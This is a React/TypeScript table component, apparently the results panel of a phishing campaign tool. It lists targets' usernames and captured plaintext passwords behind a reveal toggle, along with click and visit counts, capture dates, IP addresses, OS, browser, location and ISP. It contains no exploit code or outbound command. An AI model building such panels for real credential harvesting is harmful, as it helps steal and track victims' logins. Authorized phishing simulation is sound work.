"use client";

import React from "react";

import { HeaderRow, Row, Cell } from "@table-library/react-table-library/table";
import { HeaderCell, Table } from "@table-library/react-table-library/table";
import { Virtualized } from "@table-library/react-table-library/virtualized";
import { useTree, CellTree } from "@table-library/react-table-library/tree";
import { getTheme } from "@table-library/react-table-library/baseline";
import { useTheme } from "@table-library/react-table-library/theme";
import { useState } from "react";

import { SlArrowRight, SlArrowDown } from "react-icons/sl";
import { FaEye, FaEyeSlash } from "react-icons/fa6";
import { IUser } from "@/types/globals";

interface ITableProps {
  values: IUser[];
}

function PasswordCell({ password }: { password: string }) {
  const [show, setShow] = useState(false);

  return (
    <div className="flex h-full w-full">
      <div className="w-[80%]">
        <input
          className="w-full bg-transparent px-1 py-2"
          type={show ? "text" : "password"}
          defaultValue={password}
          disabled
        />
      </div>
      <button onClick={() => setShow(!show)} className="w-[20%]">
        {!show ? <FaEye /> : <FaEyeSlash />}
      </button>
    </div>
  );
}

function renderUserRow(item: IUser, index: number) {
  return (
    <Row key={item.id} item={item}>
      <CellTree item={item} stiff>
        {index + 1}
      </CellTree>
      <Cell>{item.username}</Cell>
      <Cell>
        {item.password ? <PasswordCell password={item.password} /> : "N/A"}
      </Cell>
      <Cell>{item.read ? "Yes" : "No"}</Cell>
      <Cell>{item.captured ? "Yes" : "No"}</Cell>
      <Cell>
        {(item.captureDate &&
          item.captureDate.toLocaleDateString("en-US", {
            year: "numeric",
            month: "2-digit",
            day: "2-digit",
          })) ||
          "N/A"}
      </Cell>
      <Cell>{item.clicks || "N/A"}</Cell>
      <Cell>{item.visits}</Cell>
    </Row>
  );
}

function renderMetadataRow(item: IUser) {
  const RenderCell = ({ label, value }: any) => {
    return <Cell>{`${label}: ${value ? value : "N/A"}`}</Cell>;
  };

  return (
    <Row key={item.id} item={item}>
      <CellTree item={item} stiff></CellTree>
      <RenderCell label="IP" value={item.ip} />
      <RenderCell label="OS" value={item.os} />
      <RenderCell label="Browser" value={item.browser} />
      <RenderCell label="Country" value={item.country} />
      <RenderCell label="City" value={item.city} />
      <RenderCell label="ISP" value={item.isp} />
      <Cell></Cell>
    </Row>
  );
}

export default function Tables({ values }: ITableProps) {
  const theme = useTheme({
    ...getTheme(),
    Table:
      "--data-table-library_grid-template-columns: minmax(0px, min-content) minmax(0px, 1fr) minmax(0px, 1fr) minmax(0px, 1fr) minmax(0px, 1fr) minmax(0px, 1fr) minmax(80px, min-content) minmax(80px, min-content)",
  });

  const ROW_HEIGHT = 30;
  const data = { nodes: values };

  const tree = useTree(
    data,
    {},
    {
      treeIcon: {
        margin: "4px",
        iconRight: <SlArrowRight />,
        iconDown: <SlArrowDown />,
      },
    }
  );

  return (
    <div style={{ height: "600px" }}>
      <Table
        data={data}
        layout={{ isDiv: true, fixedHeader: true, custom: true }}
        theme={theme}
        tree={tree}
      >
        {(tableList: any) => (
          <Virtualized
            tableList={tableList}
            rowHeight={ROW_HEIGHT}
            header={() => (
              <HeaderRow>
                <HeaderCell resize stiff>
                  #
                </HeaderCell>
                <HeaderCell resize>Username</HeaderCell>
                <HeaderCell resize>Password</HeaderCell>
                <HeaderCell resize>Read</HeaderCell>
                <HeaderCell resize>Captured</HeaderCell>
                <HeaderCell resize>Capture date</HeaderCell>
                <HeaderCell resize>Clicks</HeaderCell>
                <HeaderCell resize>Visits</HeaderCell>
              </HeaderRow>
            )}
            body={(item: IUser, index) => {
              if (item.username) {
                return renderUserRow(item, index);
              }
              // Asume que si no tiene username, entonces es de tipo metadatos.
              return renderMetadataRow(item);
            }}
          />
        )}
      </Table>
    </div>
  );
}

// <Row item={item}>
//   <CellTree item={item} stiff>
//     {!item.id.toString().startsWith("metadata") ? index : ""}
//   </CellTree>

//   <Cell>
//     {item?.username ||
//       (item.ip && <PasswordCell password={"IP: " + item.ip} />) ||
//       "N/A"}
//   </Cell>

//   <Cell>
//     {(item?.password && (
//       <PasswordCell password={item?.password} />
//     )) ||
//       "OS: " + item.os ||
//       "N/A"}
//   </Cell>

//   <Cell>{item?.isRead ? "Yes" : "No"}</Cell>

//   <Cell>
//     {item?.isCaptured?.toString() ||
//       "Country: " + item.country ||
//       "N/A"}
//   </Cell>

//   <Cell>
//     {item?.captureDate?.toLocaleDateString("en-US", {
//       year: "numeric",
//       month: "2-digit",
//       day: "2-digit",
//     }) ||
//       "Browser: " + item.browser ||
//       "N/A"}
//   </Cell>

//   <Cell>{item?.numClicks || "City: " + item.city || "N/A"}</Cell>
//   <Cell>{item?.numVisits || "ISP: " + item.isp}</Cell>
// </Row>

// import { Body, Row, Header } from "@table-library/react-table-library/table";
// import { HeaderRow, Cell } from "@table-library/react-table-library/table";
// import * as ReactTable from "@table-library/react-table-library/table";

// import { Virtualized } from "@table-library/react-table-library/virtualized";
// import { useTree, CellTree } from "@table-library/react-table-library/tree";
// import { HeaderCellSort } from "@table-library/react-table-library/sort";
// import { getTheme } from "@table-library/react-table-library/baseline";
// import { HeaderCell } from "@table-library/react-table-library/table";
// import { useTheme } from "@table-library/react-table-library/theme";
// import { useSort } from "@table-library/react-table-library/sort";

// <div style={{ height: "600px" }}>
//   <ReactTable.Table data={data} layout={{ isDiv: true, fixedHeader: true }}>
//     {(tableList: any) => (
//       <Virtualized
//         tableList={tableList}
//         rowHeight={ROW_HEIGHT}
//         header={() => (
//           <HeaderRow>
//             <HeaderCell stiff>Index</HeaderCell>
//             <HeaderCell>Task</HeaderCell>
//             <HeaderCell>Deadline</HeaderCell>
//             <HeaderCell>Type</HeaderCell>
//             <HeaderCell>Complete</HeaderCell>
//             <HeaderCell>Tasks</HeaderCell>
//           </HeaderRow>
//         )}
//         body={(item, index) => (
//           <Row item={item}>
//             <Cell stiff>{index}</Cell>
//             <Cell>{item.name}</Cell>
//             <Cell>
//               {item.deadline.toLocaleDateString("en-US", {
//                 year: "numeric",
//                 month: "2-digit",
//                 day: "2-digit",
//               })}
//             </Cell>
//             <Cell>{item.type}</Cell>
//             <Cell>{item.isComplete.toString()}</Cell>
//             <Cell>{item.nodes?.length}</Cell>
//           </Row>
//         )}
//       />
//     )}
//   </ReactTable.Table>
// </div>
